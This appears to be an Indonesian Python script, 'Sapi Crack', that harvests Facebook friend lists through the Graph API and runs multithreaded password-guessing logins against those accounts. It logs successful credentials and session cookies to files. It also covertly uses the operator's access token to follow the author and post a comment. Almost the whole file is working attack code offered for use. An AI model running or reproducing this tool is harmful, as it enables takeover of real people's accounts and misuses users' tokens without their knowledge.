#JANGAN DIPERJUAL BELIKAN!
#RECODE? BOLEH! JANGAN UBAH BOT FOLLOW SAMA KOMEN

#AUTHOR: MUHAMMAD LATIF HARKAT
#WA: 083870396203
#FB: Latif Latif Latif Latif
#SC VERSION: 1.0 (BETA)

#OPEN SOURCE TEAM
import requests as req,json,time,os,cowsay
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser

try:
    ua =open('ua','r').read()
except FileNotFoundError:
    print("[!] Useragent Tidak Ada")
    ja=input("[+] Masukan useragent untuk melanjutkan ke tools: ")
    open('ua','a').write(ja)
id,nama=[],[]
cot,ok,cp=0,0,0
ajg=""
try:ip=req.get('https://api.ipify.org').text
except req.exceptions.ConnectionError:print('Koneksi Buruk!')
def login():
    t=input('Masukan Access Token Anda: ')
    try:
        r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
        nama=r['name']
        req.post(f'https://graph.facebook.com/100043089921817/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/514866369959689/comments?message=Ok Thanks Latif! and hallo!&access_token={t}')
        print('Login Berhasil√\nDengan Nama Facebook:',nama)
        open('saveLogin.txt','a').write(t)
        time.sleep(0.7)
        gas(t).menu()
    except KeyError:
        print('Token Salah Bro!')
        login()
def logika():
    try:
        t=open('saveLogin.txt','r').read()
        r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
        print('Selamat Datang Kembali',r['name'],':)')
        time.sleep(0.7)
        gas(t).menu()
    except KeyError:
        print('Token Anda Invalid')
        os.system('rm -rf saveLogin.txt')
        time.sleep(0.7)
        return login()
    except FileNotFoundError:
        print('Anda Belum Login')
        time.sleep(0.7)
        login()
class gas:

    def __init__(self,token):self.token=token
    def crack(self,user,pw):
        global ok,cp,cot,ajg
        if ajg!=user:
            ajg=user
            cot+=1
        data={}
        ses=req.Session()
        ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
        a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
        b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
        for c in a("input"):
            try:
                if c.get("name") in b:data.update({c.get("name"):c.get("value")})
                else:continue
            except:pass
        data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
        d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
        if 'c_user' in d.cookies.get_dict().keys():
            ok+=1
            open('ok','a').write(user+'|'+pw+'\n')
            print(f'\r\x1b[1;32m*XNXX.COM > [OK] ~ {user}|{pw}|{d.cookies}\x1b[0m\n',end='')
        elif 'checkpoint' in d.cookies.get_dict().keys():
            cp+=1
            r=json.loads(req.get(f'https://graph.facebook.com/{user}?access_token={self.token}').text)
            try:ttl=r['birthday']
            except:ttl=''
            open('cp','a').write(user+'|'+pw+'|'+ttl+'\n')
            print(f'\r\x1b[1;33m*XNXX.COM > [CP] ~ {user}|{pw}|{ttl}\x1b[0m\n',end='')
        print(f'\rCRACK:-{str(cot)}/{len(id)} OK/CP:-{str(ok)}/{str(cp)}',end='')
    def get1(self):
        r=json.loads(req.get(f'https://graph.facebook.com/me/friends?access_token={self.token}').text)
        for x in r['data']:
            asu=x['id']
            nama=x['name'].rsplit(" ")[0]
            id.append(asu+'|'+nama)
        print('[ CRACK DAFTAR TEMAN ANDA ]')
        print('\n[+] Jumlah Teman:',str(len(id)))
        pi=input('[?] Pwlist Manual y/t: ')
        if(pi in ("y","Y")):
            with Bool(max_workers=35) as kirim:
                print("\nContoh (anjing,monyet,bangsat)")
                pwList=input('[+] Masukan Password List: ').split(",")
                print('\nStarting Crack...\n--------------------------------\n')
                for email in id:
                    uid,name=email.split('|')
                    try:
                        for pw in pwList:kirim.submit(self.crack,uid,pw)
                    except:pass
        elif(pi in ("t","T")):
            with Bool(max_workers=35) as kirim:
                print('\nStarting Crack...\n--------------------------------\n')
                for email in id:
                    uid,name=email.split('|')
                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345']
                    elif(len(str(name.lower()))<=2):
                        memek=[name.lower()+'12345']
                    elif(len(str(name.lower()))<=3):
                        memek=[name.lower()+'123',name.lower()+'12345']
                    else:
                        memek=[name.lower()+'123',name.lower()+'12345']
                    try:
                        for pw in memek:kirim.submit(self.crack,uid,pw)
                    except:pass
        print('\n### [CRACK FINISHED] ###')
    def get2(self):
        print('\n\t[ Crack ID Teman Atau Publik ]\n')
        target=input('Masukan ID Target: ')
        try:
            r=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
            print('\n[+] Nama Target:',r['name'])
        except KeyError:
            print('Target Tidak Ditemukan!')
            time.sleep(0.7)
            self.menu()
        g=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
        for latip in g['data']:
            tip=latip['id']
            harkat=latip['name'].rsplit(" ")[0]
            id.append(tip+'|'+harkat)
        print('[+] Jumlah Teman:',str(len(id)))
        memek=input("[?] Pwlist Manual y/t : ")
        if(memek in ("y","Y")):
            print("\nContoh (anjing,bangsat,monyet)")
            pwList=input("[+] Masukan Password : ").split(",")
            with Bool(max_workers=35) as kirim:
                print('\n[+] Starting Crack...\n--------------------------------\n')
                for email in id:
                    uid,name=email.split('|')
                    try:
                        for pw in pwList:kirim.submit(self.crack,uid,pw)
                    except:pass
        elif(memek in ("t","T")):
            with Bool(max_workers=35) as kirim:
                print('\nStarting Crack...\n--------------------------------\n')
                for email in id:
                    uid,name=email.split('|')
                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345']
                    elif(len(str(name.lower()))<=2):                               memek=[name.lower()+'1234',name.lower()+'12345']
                    elif(len(str(name.lower()))<=3):
                        memek=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345']
                    else:
                        memek=[name.lower()+'1234',name.lower()+'12345']
                    try:
                        for pw in memek:
                            kirim.submit(gas(self.token).crack,uid,pw)
                    except:pass
        print('\n### [CRACK FINISHED] ###')
    def ua(self):
        print('\n\t[ Useragent Setting ]\n\n# Useragent Saat Ini:',open('ua','r').read(),'\n')
        a=input('[?] Ganti useragent y/t: ')
        if(a in ("y","Y")):
            os.system('rm -rf ua')
            ua=input('[+] Masukan useragent baru: ')
            open('ua','a').write(ua)
            input('\n[√] Useragent Berhasil Ditambahkan\n[ Enter For Back To Menu ]')
            self.menu()
        elif(a in ("t","T")):
            input("Enter For Back To Menu")
            self.menu()
    def menu(self):
        name=json.loads(req.get(f'https://graph.facebook.com/me?access_token={self.token}').text)['name']
        os.system('clear')
        cowsay.cow(f'Hallo: {name} :)\nYour IP: {ip}')
        print('\n\t[ CODED BY: MUHAMMAD LATIF HARKAT ]\n\t\tSapi Crack Version: 1.0 (BETA)\n\nPilih Metode Crack!\n\n1. Crack Daftar Teman Anda\n2. Crack Daftar Teman Orang\n3. Setting Useragent\n4. Hapus Token (logout)\n')
        p=input('[+] Chosee: ')
        if(p in ('01','1')):self.get1()
        elif(p in ('02','2')):self.get2()
        elif(p in ('03','3')):self.ua()
        elif(p in ('04','4')):
            print('Ok Thanks You Bro Nic To Meet You!')
            os.system('rm -rf saveLogin.txt')
        else:
            print('Pilihan Tidak Ada!')
            self.menu()
if __name__=="__main__":
    logika()
